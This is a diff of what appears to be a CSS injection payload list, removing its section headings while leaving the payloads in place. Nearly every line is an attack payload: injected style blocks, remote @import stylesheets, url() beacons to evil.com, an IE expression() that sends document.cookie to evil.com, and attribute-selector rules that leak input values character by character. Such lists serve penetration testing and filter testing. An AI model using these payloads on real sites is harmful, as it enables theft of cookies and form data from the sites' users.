@@ -1,38 +1,24 @@
-# ============================================================
-# CSS Injection — Basic Payloads
-# ============================================================
-
-# ---- Style Injection ----
 <style>* { background: red }</style>
 <style>body { display: none }</style>
 <style>@import url("https://evil.com/malicious.css")</style>
 </style><style>* { background: url(https://evil.com/?) }</style>
 
-# ---- Property Injection (in existing style attribute) ----
 color: red; background: url(https://evil.com/log?)
 font-size: 200px; content: url(https://evil.com/log?)
 background: url(javascript:alert(1))
 
-# ---- Expression (IE only) ----
 width: expression(alert(1))
 background: expression(document.location='https://evil.com/?'+document.cookie)
 
-# ---- CSS url() for Image Loading ----
 background: url(https://evil.com/pixel.png?leak=)
 list-style-image: url(https://evil.com/pixel?)
 cursor: url(https://evil.com/pixel?)
 border-image: url(https://evil.com/pixel?)
 
-# ---- @import Exfiltration ----
 @import url("https://evil.com/leak.css");
 @import "https://evil.com/leak.css";
 
-# ---- content: counter Exfiltration ----
 input[value="a"] ~ * { background: url(https://evil.com/?c=a) }
 input[value="b"] ~ * { background: url(https://evil.com/?c=b) }
 
-# ---- Custom Property Injection ----
 --bg: url(https://evil.com/?); background: var(--bg)
-
-# ---- Keylogger via CSS Attribute Selector ----
-# See data_exfiltration.txt for advanced CSS keylogger
